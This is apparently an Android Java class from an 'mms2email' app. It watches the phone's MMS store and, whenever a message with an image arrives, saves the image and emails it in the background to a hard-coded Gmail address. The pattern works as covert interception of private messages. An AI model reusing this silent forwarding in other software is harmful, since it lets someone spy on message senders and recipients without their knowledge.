package com.studioY.mms2email;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MMSMonitor {
    private static final String OUTGOING_MMS = "outgoing mms";
    private static final String INCOMING_MMS = "incoming mms";
    private Context context;
    private ContentResolver contentResolver = null;
    private Handler mmshandler = null;
    private ContentObserver mmsObserver = null;
    public String mmsNumber = "";
    public boolean monitorStatus = false;
    static public String activationCode;
    int mmsCount = 0;
    String lastMMSTxId = null;
    String code;

    public MMSMonitor(final Context mainContext) {
        this.context = mainContext;
        contentResolver = mainContext.getContentResolver();
        mmshandler = new MMSHandler();
        mmsObserver = new MMSObserver(mmshandler);
        Log("", "MMSMonitor :: ***** Start MMS Monitor *****");
    }

    public void startMMSMonitoring() {
        try {
            monitorStatus = false;
            if (!monitorStatus) {
                contentResolver.registerContentObserver(Uri.parse("content://mms-sms"), true, mmsObserver);

                Uri uriMMSURI = Uri.parse("content://mms");
                Cursor mmsCur = context.getContentResolver().query(uriMMSURI, null, "msg_box = 4", null, "_id");
                if (mmsCur != null && mmsCur.getCount() > 0) {
                    mmsCount = mmsCur.getCount();
                    Log("", "MMSMonitor :: Init MMSCount ==" + mmsCount);
                }
                if(mmsCur == null){
                    Log("", "MMSMonitor :: Cursor == NULL");
                }else{
                    Log("", "MMSMonitor :: Cursor is not NULL, mmsCount = " + mmsCount);
                }
            }
        } catch (Exception e) {
            Log("", "MMSMonitor :: startMMSMonitoring Exception== "+ e.getMessage());
        }
    }


    public void stopMMSMonitoring() {
        try {
            monitorStatus = false;
            if (!monitorStatus){
                contentResolver.unregisterContentObserver(mmsObserver);
            }
        } catch (Exception e) {
            Log("", "MMSMonitor :: stopMMSMonitoring Exception == "+ e.getMessage());
        }
    }


    class MMSHandler extends Handler {
        public void handleMessage(final Message msg) {
            //Log("MMS", "MMSMonitor :: Handler");
        }
    }


    class MMSObserver extends ContentObserver {
        private Handler mms_handle = null;
        public MMSObserver(final Handler mmshandle) {
            super(mmshandle);
            mms_handle = mmshandle;
        }

        public void onChange(final boolean bSelfChange) {
            super.onChange(bSelfChange);
            Log("", "MMSMonitor :: Onchange");

            Thread thread = new Thread() {
                public void run() {
                    try {
                        monitorStatus = true;

                        // Send message to Activity
                        Message msg = new Message();
                        mms_handle.sendMessage(msg);

                        // Getting the mms count
                        Uri uriMMSURI = Uri.parse("content://mms/");
                        Cursor mmsCur = context.getContentResolver()
                                .query(uriMMSURI, null, "msg_box = 4 or msg_box = 1", null,"_id");

                        int currMMSCount = 0;
                        if (mmsCur != null && mmsCur.getCount() > 0) {
                            currMMSCount = mmsCur.getCount();
                        }

                        if(mmsCur == null){
                            Log("", "MMSMonitor :: mmsCur is null" );
                        }else{
                            Log("", "MMSMonitor :: mmsCur is not null, currMMSCount : " + currMMSCount + ", mmsCount : " + mmsCount );
                        }

                        if (currMMSCount >= mmsCount) {
                            mmsCount = currMMSCount;
                            mmsCur.moveToLast();

                            // get id , subject
                            //String subject = mmsCur.getString(6);
                            //int id = Integer.parseInt(mmsCur.getString(0));
                            String subject = mmsCur.getString(mmsCur.getColumnIndex("sub"));
                            int id = Integer.parseInt(mmsCur.getString(mmsCur.getColumnIndex("_id")));
                            Log("", "MMSMonitor :: _id  == " + id);
                            Log("", "MMSMonitor :: Subject == " + subject);

                            byte[] imgData = null;
                            String message = "";
                            String address = "";
                            String fileName = "";
                            String fileType = "";
                            String direction = "";

                            // GET DIRECTION
                            boolean isIncoming = false;
                            //int type = Integer.parseInt(mmsCur.getString(12));
                            int type = Integer.parseInt(mmsCur.getString(mmsCur.getColumnIndex("m_type")));
                            if (type == 128) {
                                direction = OUTGOING_MMS;
                                Log("", "MMSMonitor :: Type == Outgoing MMS");
                            } else {
                                isIncoming = true;
                                direction = INCOMING_MMS;
                                Log("", "MMSMonitor :: Type == Incoming MMS");
                            }

                            // Get Parts
                            Uri uriMMSPart = Uri.parse("content://mms/part");
                            Cursor curPart = context.getContentResolver()
                                    .query(uriMMSPart, null, "mid = " + id,   null, "_id");
                            Log("", "MMSMonitor :: parts records length == "+ curPart.getCount());
                            curPart.moveToLast();
                            do {

                                if(direction.equals(OUTGOING_MMS)){
                                    Log("", "outgoing mms, do nothing");
                                    break;
                                }

                                //String contentType = curPart.getString(3);
                                //String partId = curPart.getString(0);
                                String contentType = curPart.getString(curPart.getColumnIndex("ct"));
                                String partId = curPart.getString(curPart.getColumnIndex("_id"));
                                Log("", "MMSMonitor :: partId == " + partId);
                                Log("", "MMSMonitor :: part mime type == "+ contentType);

                                // Get the message
                                if (contentType.equalsIgnoreCase("text/plain"))
                                {
                                    Log("","MMSMonitor :: ==== Get the message start ====");
                                    byte[] messageData = readMMSPart(partId);
                                    if (messageData != null && messageData.length > 0)
                                        message = new String(messageData);

                                    if(message == ""){
                                        Cursor curPart1 = context.getContentResolver()
                                                .query(uriMMSPart, null, "mid = " + id +
                                                        " and _id =" + partId,null, "_id");
                                        for (int i = 0; i < curPart1.getColumnCount(); i++)
                                        {
                                            Log("","MMSMonitor :: Column Name : " +
                                                    curPart1.getColumnName(i));
                                        }
                                        curPart1.moveToLast();
                                        message = curPart1.getString(13);
                                    }
                                    Log("","MMSMonitor :: Txt Message == " + message);
                                }


                                // Get X-param
                                else if (contentType.equalsIgnoreCase("text/X-param")) {
                                    Log("","MMSMonitor :: ==== Get X-param start ====");
                                    Log("","MMSMonitor :: X-param Message");
                                }

                                // Get Image
                                else if (isImageType(contentType) == true) {

                                    Log("","MMSMonitor :: ==== Get the Image start ====");
//                                    fileName = "mms_" + partId;
//                                    fileType = contentType;
//                                    imgData = readMMSPart(partId);
                                    Bitmap bitmap = getMmsImage(partId);

                                    Log("", "MMSMonitor :: Iimage width : "+ bitmap.getWidth() + " height : " + bitmap.getHeight());

                                    try{
                                        GMailSender sender = new GMailSender("unpaidfee@gmail.com", "");

                                        saveBitmapToFileCache(bitmap, context.getCacheDir().toString() + "/temp.jpg");

                                        sender.addAttachment(context.getCacheDir().toString() + "/temp.jpg", "첨부제목");
                                        sender.sendMail("테스트 제목", "본문", "unpaidfee@gmail.com", "unpaidfee@gmail.com");
                                    }catch (Exception e){
                                        Log("", e.getMessage());
                                    }
                                }
                            } while (curPart.moveToPrevious());
                        }

                    } catch (Exception e) {
                        Log("", "MMSMonitor Exception:: "+ e.getMessage());
                    }
                }
            };
            thread.start();
        }
    }

    private void saveBitmapToFileCache(Bitmap bitmap, String strFilePath) {

        File fileCacheItem = new File(strFilePath);
        OutputStream out = null;

        try
        {
            fileCacheItem.createNewFile();
            out = new FileOutputStream(fileCacheItem);

            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, out);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        finally
        {
            try
            {
                out.close();
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
        }
    }

    private Bitmap getMmsImage(String _id) {
        Uri partURI = Uri.parse("content://mms/part/" + _id);
        InputStream is = null;
        Bitmap bitmap = null;
        try {
            is = context.getContentResolver().openInputStream(partURI);
            bitmap = BitmapFactory.decodeStream(is);
        } catch (IOException e) {}
        finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {}
            }
        }
        return bitmap;
    }


    private byte[] readMMSPart(String partId) {
        byte[] partData = null;
        Uri partURI = Uri.parse("content://mms/part/" + partId);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        InputStream is = null;

        try {

            Log("","MMSMonitor :: Entered into readMMSPart try..");
            ContentResolver mContentResolver = context.getContentResolver();
            is = mContentResolver.openInputStream(partURI);

            byte[] buffer = new byte[256];
            int len = is.read(buffer);
            while (len >= 0) {
                baos.write(buffer, 0, len);
                len = is.read(buffer);
            }
            partData = baos.toByteArray();
            //Log.i("", "Text Msg  :: " + new String(partData));

        } catch (IOException e) {
            Log("", "MMSMonitor :: Exception == Failed to load part data");
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                    Log("", "Exception :: Failed to close stream");
                }
            }
        }
        return partData;
    }


    private boolean isImageType(String mime) {
        boolean result = false;
        if (mime.equalsIgnoreCase("image/jpg")
                || mime.equalsIgnoreCase("image/jpeg")
                || mime.equalsIgnoreCase("image/png")
                || mime.equalsIgnoreCase("image/gif")
                || mime.equalsIgnoreCase("image/bmp")) {
            result = true;
        }
        return result;
    }

    public void Log(String tag, String message)   {
//        Logger.getInstance(Logger.DEBUG).log(this.getClass().getSimpleName(),
//                tag, message);
        Log.d(tag, message);
    }

}
